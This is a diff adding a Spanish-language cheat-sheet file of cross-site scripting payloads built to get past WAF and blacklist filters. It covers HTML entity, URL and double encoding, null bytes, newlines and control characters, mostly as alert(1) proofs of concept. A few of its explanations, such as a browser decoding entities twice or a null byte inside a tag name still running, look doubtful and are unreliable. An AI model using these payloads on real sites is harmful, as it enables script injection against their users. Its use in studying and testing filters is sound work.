@@ -1,0 +1,70 @@
+# =========================================================
+# PAYLOADS XSS DE CODIFICACIÓN Y EVASIÓN (Encoding and Evasion)
+# =========================================================
+# La codificación (encoding) se utiliza para que el navegador interprete el payload, 
+# mientras que un filtro WAF/lista negra no lo haga.
+
+# 1. CODIFICACIÓN HTML / DECIMAL Y HEXADECIMAL
+# ---------------------------------------------
+# El navegador decodifica estas entidades antes de que se ejecute el script. 
+# Esto bypassa filtros que solo buscan el string literal '<script>'.
+
+# 1.1 Codificación Decimal (Ejemplo para '<' y '>')
+# PAYLOAD: &#60;script&#62;alert(1)&#60;/script&#62;
+
+# 1.2 Codificación Hexadecimal (Ejemplo para '<' y '>')
+# PAYLOAD: &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
+
+# 1.3 Codificación Mixta
+# Se puede codificar solo una parte del payload para romper la detección del string.
+# PAYLOAD: <img src=x on&#101;rror=alert(1)>
+# (&#101; es la 'e' en decimal)
+
+# 2. CODIFICACIÓN URL (URL Encoding)
+# -----------------------------------
+# Útil cuando el input se refleja desde un parámetro URL (Query String).
+# Los navegadores decodifican automáticamente estos caracteres.
+
+# Caracteres codificados:
+# <  -> %3c
+# >  -> %3e
+# (  -> %28
+# )  -> %29
+# Espacio -> %20 o +
+
+# 2.1 Payload URL-Encoded (Ejemplo para <img src=x onerror=alert(1)>)
+# PAYLOAD: %3cimg%20src%3dx%20onerror%3dalert%281%29%3e
+
+# 3. DOBLE CODIFICACIÓN (Double Encoding)
+# ----------------------------------------
+# Intenta engañar a WAFs que decodifican solo una vez. 
+# El browser necesita decodificar dos veces para que funcione, lo cual es inusual, 
+# pero puede ser explotado si la aplicación decodifica el input antes de sanitizarlo y luego 
+# el navegador lo decodifica de nuevo antes de ejecutarlo.
+
+# 3.1 Doble Codificación HTML de los caracteres clave
+# El navegador decodifica la primera vez: &#x26;#x... -> &#x...
+# El navegador decodifica la segunda vez: &#x... -> <
+# PAYLOAD: &#x26;#x3c;script&#x26;#x3e;alert(1)&#x26;#x3c;/script&#x26;#x3e;
+
+# 4. USO DE CARACTERES NULOS O ESPECIALES
+# ----------------------------------------
+# Insertar caracteres nulos o "newlines" puede confundir a los parsers regex.
+
+# 4.1 Caracter Nulo (Null Byte)
+# Útil para intentar terminar un string en el servidor o confundir a un parser.
+# PAYLOAD: <scr%00ipt>alert(1)</scr%00ipt>
+
+# 4.2 Newline / Retorno de Carro (CR/LF)
+# Puede ser usado en algunos contextos para romper la coincidencia de patrones.
+# PAYLOAD: <img src="x
+# onerror=alert(1)">
+
+# 5. MANIPULACIÓN DE ESPACIOS Y CARACTERES DE CONTROL
+# ----------------------------------------------------
+# Usar espacios alternativos o la falta de ellos.
+
+# 5.1 Espacio Tabulador Horizontal (HT) o Feed de Línea (LF)
+# Los navegadores a menudo aceptan caracteres de control en lugar de espacios.
+# HT: %09, LF: %0A
+# PAYLOAD: <img%0A%09src%0A%09=x%0A%09onerror%0A%09=alert(1)>
